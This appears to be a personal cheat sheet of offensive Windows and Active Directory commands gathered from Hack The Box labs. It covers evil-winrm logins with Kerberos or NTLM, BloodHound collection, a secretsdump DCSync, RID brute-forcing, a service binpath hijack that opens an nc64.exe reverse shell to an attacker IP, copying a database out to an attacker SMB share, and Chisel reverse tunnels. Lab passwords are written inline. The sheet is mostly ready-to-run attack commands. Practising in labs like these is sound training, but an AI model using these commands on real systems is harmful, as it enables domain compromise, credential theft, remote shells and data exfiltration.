___


*Connecting with evil-winrm with KRB ticket*

*This worked for win-rm* -> this has to be the ugliest command I have ever written

```
KRB5CCNAME=./svc_winrm.ccache sudo docker run --rm -it -v "./svc_winrm.ccache:/tmp/krb5cc_0" -v "./krb5.conf:/etc/krb5.conf" -v "/etc/hosts:/etc/hosts:ro" evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB 
```


 *NTLM authentication*
 ```
 sudo docker run --rm -it evil-winrm -i 10.10.11.108 -u 'svc-printer' -p 'password123' 
 ```


Note
---
Are you using Kerberos or NTLM authentication? Pay attention the commands may change!


*Generating TGT for user*
```
nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' --generate-tgt f.frizzle
```

*Grabbing bloodhound info*
```
bloodhound-python -u 'svc-printer' -p '1edFg43012!!' -ns 10.10.11.108 -dc printer.return.local -d return.local -c All  
```

*Starting Bloodhound (neo4j needs to be running)*
```
start neo4j
sudo neo4j console
```

*Useful Impacket Scripts*
```
getST.py
ntlmrelayx.py
secretsdump.py
```

*DCsync attack*
```
secretsdump.py 'puppy.htb'/steph.cooper_adm:'FivethChipOnItsWay2025!'@10.10.11.180 
```

*Rpcclient guest with no password*
```
rpcclient 10.10.11.108 -U 'guest%' 
rpcclient $> lookupnames administrator
```

*Lookupsids*
```
lookupsid.py svc-printer@10.10.11.108
or
netexec smb 10.10.11.222 -u guest -p '' --rid-brute
```


*Uses SAM remote interface to enumerate users, works over smb/RPC*
```
samrdump.py return.local/svc-printer:'1edFg43012!!'@10.10.11.108 
```


*powershell/cmd enumeration*
--
whoami /priv
whoami /groups

sc.exe query -> list running services

*list services*
```
 $services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
```


*Services*
---

*Adding a service*
```
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.6 443"
```

*Running service on attacker machine*
```
sc.exe start VSS
```


*Exfil*
---

*List all open ports*
```
netstat -a 
```

*Copy docker files in and out of container*
```
sudo docker cp 245f71c07597:/data/site-backup-2024-12-30.zip ./loot/site-backup-2024-12-30.zip
```

*Start smb server for file transfer from windows*
```
smbserver.py share . -username 0xdf -password 0xdf -smb2support
```

 *Use share*
```
net use \\10.10.14.6\share /u:0xdf 0xdf
```

*copy to share*
```
copy data\gitea.db //10.10.14.6/share/
```


*Extras*
---

*RunAs.exe command*
```
.\r.exe openfire 'HotP!fireguard' powershell -r 10.10.14.6:444 --logon-type 5 --bypass-uac
```


*Chisel Command (rev proxy for tunneling)*
on attacker machine
```
./chisel_1.10.1_linux_amd64 server --reverse --port 7878
```
on target
```
chisel.exe client 10.10.14.24:7878 R:9090:127.0.0.1:9090 
```



